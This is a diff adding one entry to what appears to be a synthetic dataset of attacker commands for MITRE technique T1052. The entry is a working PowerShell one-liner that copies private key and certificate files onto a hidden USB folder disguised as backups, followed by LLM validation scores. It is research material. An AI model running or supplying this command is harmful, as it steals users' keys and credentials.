@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb 'drivers'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Get-ChildItem -Path \"$env:USERPROFILE\\Desktop\",\"$env:USERPROFILE\\Documents\" -Include *.key,*.pem,*.pfx,*.ppk -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName (Join-Path $dst ($_.Name + '.bak')) -Force }",
+  "explanation": "Searches for key material and copies it to a hidden folder on the USB using Copy-Item, appending a .bak extension to look like backups.",
+  "rationale_steps": [
+    "Locate removable media",
+    "Create hidden destination directory",
+    "Search for credential/key files",
+    "Copy to USB via Copy-Item with benign-looking extensions"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-825461b7",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced quoting, valid cmdlets/parameters, and proper statement separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies key files in user directories and copies them to a hidden folder on a detected removable drive with obfuscating extensions, matching exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:17:14.098240Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper string concatenation, valid cmdlet usage, correct pipeline operators, and no syntax errors throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable USB drive, creating a hidden 'drivers' folder to blend in, then recursively searching user profile locations for cryptographic key material (*.key, *.pem, *.pfx, *.ppk) and copying them with a .bak extension to evade detection — fully consistent with staging and obfuscating data for physical medium exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:41:36.877215Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell syntax is perfectly formed with correct command chaining, variable assignments, and pipeline usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the exfiltration technique by identifying a removable drive, staging files with deceptive extensions, and hiding the destination directory.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:41:40.345697Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
